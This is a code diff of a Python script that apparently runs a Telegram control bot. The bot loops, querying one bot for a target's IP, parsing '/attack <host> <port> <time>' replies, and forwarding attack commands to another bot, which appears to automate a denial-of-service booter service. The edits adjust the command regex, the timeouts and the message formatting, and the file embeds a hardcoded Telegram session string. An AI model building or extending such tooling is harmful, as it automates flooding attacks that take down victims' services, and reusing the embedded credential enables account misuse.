@@ -18,23 +18,25 @@ STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qU
 
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
-# chat_id -> target, chat_id -> telethon task, chat_id -> future for IP reply
-chat_targets: dict[int, str] = {}
-loop_tasks: dict[int, asyncio.Task] = {}
-waiting_futures: dict[int, asyncio.Future] = {}
+chat_targets: dict[int, str] = {}          # chat_id -> target
+loop_tasks: dict[int, asyncio.Task] = {}   # chat_id -> telethon task
+waiting_futures: dict[int, asyncio.Future] = {}  # chat_id -> future for IP reply
 bot_b_status = "UNKNOWN"
 
-IP_CMD_REGEX = re.compile(
-    r"/attacks+(d+.d+.d+.d+)s+(d+)s+(d+)",
-    re.I,
-)
+# /attack <ip_or_host> <port> <time>
+IP_CMD_REGEX = re.compile(r"/attacks+S+s+d+s+d+", re.I)
+
 
 # ------------- BOT-A LISTENER (IP BOT) -------------
 @tele.on(events.NewMessage(from_users=BOT_A))
 async def bot_a_listener(event):
     text = event.text or ""
     print("IP BOT REPLY:", text)
-    # sabse pehle open future ko resolve karo
+
+    # Sirf tab future resolve karo jab /attack pattern mila ho
+    if not IP_CMD_REGEX.search(text):
+        return
+
     for cid, fut in list(waiting_futures.items()):
         if not fut.done():
             fut.set_result(text)
@@ -74,7 +76,7 @@ async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
         await tele.send_message(BOT_A, f".getip all {target}")
 
         try:
-            reply = await asyncio.wait_for(fut, timeout=30)
+            reply = await asyncio.wait_for(fut, timeout=60)
         except asyncio.TimeoutError:
             await context.bot.send_message(chat_id, "⏱️ IP bot timeout, retrying...")
             await asyncio.sleep(5)
@@ -100,7 +102,8 @@ async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
         await tele.send_message(BOT_B, attack_cmd)
         await context.bot.send_message(
             chat_id,
-            f"✅ Task sent:`{attack_cmd}`",
+            f"✅ Task sent:
+`{attack_cmd}`",
             parse_mode="Markdown",
         )
         await asyncio.sleep(3)
@@ -122,7 +125,6 @@ async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Loop already running")
         return
 
-    # Telethon ke loop par task run karo
     task = tele.loop.create_task(telethon_loop(cid, context))
     loop_tasks[cid] = task
     await update.message.reply_text("🔁 Loop started")
@@ -151,7 +153,6 @@ async def run_telethon():
 
 # ------------- MAIN (SYNC PTB) -------------
 def main():
-    # Telethon background thread
     t = threading.Thread(target=start_telethon, daemon=True)
     t.start()
 
@@ -161,7 +162,7 @@ def main():
     app.add_handler(CommandHandler("stoploop", stoploop))
 
     print("🤖 Control bot running")
-    app.run_polling()   # yahan koi asyncio.run / await nahi
+    app.run_polling()
 
 
 if __name__ == "__main__":
